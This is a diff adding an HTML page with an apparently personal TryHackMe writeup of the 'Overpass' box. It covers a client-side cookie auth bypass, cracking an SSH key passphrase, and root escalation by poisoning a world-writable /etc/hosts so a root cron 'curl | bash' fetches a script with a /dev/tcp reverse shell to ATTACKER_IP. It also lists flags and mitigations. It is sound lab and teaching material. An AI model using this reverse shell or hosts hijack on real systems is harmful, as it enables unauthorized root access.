@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Overpass — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Overpass serves a Go-based "password manager" on port 80. gobuster finds /admin, whose login is gated entirely in the browser — login.js stores whatever…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/overpass.html">
+<meta property="og:title" content="Overpass — TryHackMe writeup">
+<meta property="og:description" content="Overpass serves a Go-based "password manager" on port 80. gobuster finds /admin, whose login is gated entirely in the browser — login.js stores whatever…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/overpass.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Overpass — TryHackMe writeup","description":"Overpass serves a Go-based \"password manager\" on port 80. gobuster finds /admin, whose login is gated entirely in the browser — login.js stores whatever…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-10-23","url":"https://thecyberfarhan.github.io/writeups/overpass.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/overpass.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Overpass</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>October 23, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Overpass serves a Go-based "password manager" on port 80. <code>gobuster</code> finds <code>/admin</code>, whose login is gated entirely in the browser — <code>login.js</code> stores whatever the API returns as a <code>SessionToken</code> cookie, and the admin page only checks that the cookie *exists*. Setting that cookie to anything unlocks a page holding a passphrase-protected RSA key for <code>james</code>. <code>ssh2john</code> + <code>john</code> crack the passphrase (<code>james13</code>), and the key logs in over SSH. On the box, root's crontab runs <code>curl overpass.thm/downloads/src/buildscript.sh | bash</code> every minute, and <code>/etc/hosts</code> is world-writable — point the hostname at your own box, serve a reverse shell as the script, and root connects back in under sixty seconds. </div>
+  <div class="tools"><span class="chip">🔎 Nmap</span><span class="chip">🌐 gobuster</span><span class="chip">🖥 Browser DevTools</span><span class="chip">🔑 ssh2john / John the Ripper</span><span class="chip">🐚 SSH</span><span class="chip">🐍 python3 http.server</span><span class="chip">📡 netcat</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p><strong>Overpass</strong> is a THM Easy box built around a textbook <strong>broken authentication</strong> flaw (OWASP A07:2021) and a classic <strong>remote-code-execution-by-cron</strong> privesc. The foothold needs no exploit code at all — just reading the JavaScript the server already hands you and noticing it never actually checks anything. The escalation is a <code>curl | bash</code> pattern running as root, made trivially hijackable by a world-writable <code>/etc/hosts</code>. Neither step involves a CVE; both are configuration and design failures that show up in real environments constantly.</p>
+<h3>Prerequisites</h3>
+<p>Readers should know:</p>
+<ul><li>How browser DevTools can be used to read client-side JavaScript and set cookies manually</li><li>Why client-side-only authentication checks are fundamentally broken</li><li>What <code>ssh2john</code> / John the Ripper are for and how to crack a passphrase-protected SSH key</li><li>How <code>/etc/hosts</code> resolution works and why a world-writable copy of it is dangerous</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~5 mins)</p>
+<h3>Port Scan</h3>
+<pre><code>nmap -sC -sV -oN nmap_initial.txt 10.10.x.x</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version / Detail</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Golang net/http server — "Overpass"</td></tr></tbody></table>
+<p>Two ports. The HTTP server is a Go binary advertising itself as a "military-grade, open-source password manager." No obvious framework CVEs to chase — this is custom code.</p>
+<h3>Web Enumeration</h3>
+<pre><code>gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt</code></pre>
+<table><thead><tr><th>URL</th><th>Notes</th></tr></thead><tbody><tr><td><code>/admin</code></td><td>Login form</td></tr><tr><td><code>/aboutus</code></td><td>Static page</td></tr><tr><td><code>/downloads</code></td><td>App's own Go source + binaries</td></tr><tr><td><code>/css</code>, <code>/img</code></td><td>Static assets</td></tr></tbody></table>
+<p><code>/admin</code> is the obvious target. <code>/downloads</code> looks tempting but turns out to be a distraction (see Rabbit Holes).</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~10 mins)</p>
+<h3>Reading login.js</h3>
+<p>Before touching the form, DevTools → Sources → <code>login.js</code>:</p>
+<pre><code>async function login() {
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}</code></pre>
+<p>The API returns either the literal string <code>"Incorrect credentials"</code> or a token. The client treats *anything else* as valid and stores it. <code>/admin</code> itself only checks that <code>SessionToken</code> exists — there's no server-side session table being consulted at all. This is an IDOR's cousin: not "guess someone else's ID," but "there was never a lock on the door."</p>
+<h3>Setting the Cookie</h3>
+<pre><code>document.cookie = "SessionToken=whatever"</code></pre>
+<p>Reload <code>/admin</code>. The panel renders a note to James and, beneath it, his RSA private key:</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+...
+-----END RSA PRIVATE KEY-----</code></pre>
+<p><code>Proc-Type: 4,ENCRYPTED</code> — passphrase-protected. The key alone isn't enough.</p>
+<h3>Cracking the Passphrase</h3>
+<pre><code>chmod 600 id_rsa
+ssh2john id_rsa &gt; james_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt james_hash</code></pre>
+
+<pre><code>Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+james13          (id_rsa)</code></pre>
+<p><strong>Credentials found:</strong></p>
+<table><thead><tr><th>Username</th><th>Key passphrase</th><th>Service</th></tr></thead><tbody><tr><td><code>james</code></td><td><code>james13</code></td><td>SSH (via private key)</td></tr></tbody></table>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~12 mins)</p>
+<h3>SSH as james</h3>
+<pre><code>ssh -i id_rsa james@10.10.x.x
+# Enter passphrase for key 'id_rsa': james13</code></pre>
+
+<pre><code>james@overpass-prod:~$ id
+uid=1001(james) gid=1001(james) groups=1001(james)</code></pre>
+<p>Already a full TTY via SSH — no <code>script</code>/PTY upgrade needed.</p>
+<h3>User Flag</h3>
+<pre><code>cat ~/user.txt</code></pre>
+
+<pre><code>thm{65c1aaf000506e56996822c6281e6bf7}</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~15 mins)</p>
+<h3>Crontab</h3>
+<pre><code>cat /etc/crontab</code></pre>
+
+<pre><code>* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</code></pre>
+<p>Every minute, <strong>root</strong> fetches a script by hostname and pipes it straight to <code>bash</code>. No pinned IP, no signature check — whatever <code>overpass.thm</code> resolves to, root executes.</p>
+<h3>Can james control resolution?</h3>
+<pre><code>ls -la /etc/hosts</code></pre>
+
+<pre><code>-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts</code></pre>
+<p>World-writable. <code>james</code> can add an entry for <code>overpass.thm</code> and the root cron will fetch from wherever we point it.</p>
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Broken client-side auth</strong> — <code>/admin</code> trusts cookie presence, not validity → leaked RSA key for <code>james</code></li><li><strong>Passphrase crack</strong> — <code>ssh2john</code> + <code>john</code> → <code>james13</code> → SSH access</li><li><strong>Crontab enum</strong> — root runs <code>curl overpass.thm/... | bash</code> every minute</li><li><strong><code>/etc/hosts</code> hijack</strong> — world-writable, redirect <code>overpass.thm</code> to attack box</li><li><strong>Payload delivery</strong> — serve malicious <code>buildscript.sh</code> → root reverse shell → root flag</li></ol>
+<h3>Step-by-Step</h3>
+<p>Build the payload tree matching the cron's requested path:</p>
+<pre><code>mkdir -p ~/overpass/downloads/src &amp;&amp; cd ~/overpass
+cat &gt; downloads/src/buildscript.sh &lt;&lt;'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+EOF</code></pre>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+<pre><code>sudo python3 -m http.server 80</code></pre>
+<p>Poison resolution on the target:</p>
+<pre><code>echo "ATTACKER_IP overpass.thm" &gt;&gt; /etc/hosts</code></pre>
+<p>Within a minute:</p>
+<pre><code>10.10.x.x - - [GET /downloads/src/buildscript.sh HTTP/1.1] 200 -
+connect to [ATTACKER_IP] from (UNKNOWN) [10.10.x.x] 49876
+root@overpass-prod:/#</code></pre>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>thm{7f336f8c359dbac18d54fdd64ea753bb}</code></pre>
+
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>SQLi Fuzzing on /api/login</h3>
+<p>First instinct on seeing <code>/api/login</code> was to throw <code>' OR 1=1--</code> at it. It's a Go <code>net/http</code> handler with no SQL anywhere near the login decision — a few minutes wasted before doing the obvious thing and reading the client JS. The vuln was sitting in plaintext in the browser the entire time.</p>
+<h3>The /downloads Source Dive</h3>
+<p><code>/downloads</code> serves the full Go source for the "Overpass" app. Spent a while reversing it for hardcoded secrets or a crypto flaw in password storage. There's a vulnerable-looking weak-encryption routine in there, but it's a dead end for *this* path — the crontab is the intended route and far shorter.</p>
+<h3>SUID Hunting</h3>
+<p>Ran <code>find / -perm -4000 2&gt;/dev/null</code> out of habit. Nothing unusual — stock <code>sudo</code>, <code>passwd</code>, <code>mount</code>. Cost nothing but attention; the crontab was the real answer and should have been checked first.</p>
+<h3>Port 80 Permission Error</h3>
+<p>First attempt at <code>python3 -m http.server 80</code> without <code>sudo</code> → <code>PermissionError: [Errno 13]</code>. Port 80 is privileged. Thirty-second facepalm, fixed with <code>sudo</code>.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Client-side-only session validation on <code>/admin</code></td><td class="sev-critical">Critical</td><td>Validate session tokens server-side against a real session store on every protected request; never trust cookie presence alone</td></tr><tr><td>Passphrase-protected private key exposed via web UI</td><td class="sev-high">High</td><td>Never serve private keys through any web interface; distribute credentials via a secrets manager with audit logging</td></tr><tr><td>Weak key passphrase (<code>james13</code>), crackable via rockyou.txt</td><td class="sev-medium">Medium</td><td>Enforce stronger passphrase policy for SSH keys; consider hardware-backed keys for sensitive accounts</td></tr><tr><td>Root cron executing remote script fetched by hostname (`curl \</td><td>bash`)</td><td class="sev-critical">Critical</td><td>Never pipe network content into a privileged shell; pin to a fixed IP over TLS and verify a signature/checksum before execution</td></tr><tr><td>World-writable <code>/etc/hosts</code> (<code>0666</code>)</td><td class="sev-critical">Critical</td><td><code>chmod 644 /etc/hosts</code>; audit <code>/etc</code> for unexpected write permissions with <code>find /etc -writable -not -user root</code></td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Broken authentication doesn't need to be subtle to be devastating — here it was "the server trusts a cookie it never issued." Read client-side JavaScript *before* attacking the server; the logic flaw is often sitting there in plaintext. On the privesc side, <code>curl | bash</code> as root is a standing invitation — check crontabs and world-writable <code>/etc</code> files before reaching for linpeas.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Open DevTools on <code>/admin</code> before opening a terminal at all — the whole foothold lives in <code>login.js</code>, and the SQLi detour was pure wasted motion. After landing as <code>james</code>, the first three commands should be <code>cat /etc/crontab</code>, <code>ls -la /etc/hosts</code>, and <code>find /etc -writable -not -user root</code> — not a full enumeration script. The intended path reveals itself in under ten seconds once you look in the right place.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/overpass_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
